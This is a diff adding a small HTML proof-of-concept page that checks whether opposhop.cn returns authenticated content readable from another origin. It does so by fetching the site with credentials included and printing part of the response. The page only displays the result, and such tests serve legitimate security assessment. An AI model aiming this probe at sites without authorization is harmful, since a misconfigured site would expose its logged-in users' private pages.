@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Credential Exposure Test</title>
+  <style>
+    body { font-family: monospace; background: #0f172a; color: #e5e7eb; padding: 20px; }
+    button { padding: 10px 16px; font-size: 14px; cursor: pointer; }
+    pre { white-space: pre-wrap; background: #020617; padding: 15px; margin-top: 15px; }
+  </style>
+</head>
+<body>
+
+<h2>CORS Credential Test – opposshop.cn</h2>
+<p>This test checks whether authenticated responses are readable cross-origin.</p>
+
+<button onclick="run()">Run Test</button>
+
+<pre id="output">Waiting…</pre>
+
+<script>
+async function run() {
+  const out = document.getElementById("output");
+  out.textContent = "Requesting with credentials...\n";
+
+  try {
+    const res = await fetch("https://www.opposhop.cn/", {
+      method: "GET",
+      credentials: "include"
+    });
+
+    const text = await res.text();
+
+    out.textContent =
+      "STATUS: " + res.status + "\n" +
+      "RESPONSE TYPE: " + res.type + "\n" +
+      "RESPONSE LENGTH: " + text.length + "\n\n" +
+      text.slice(0, 800);
+
+  } catch (e) {
+    out.textContent = "ERROR:\n" + e;
+  }
+}
+</script>
+
+</body>
+</html>
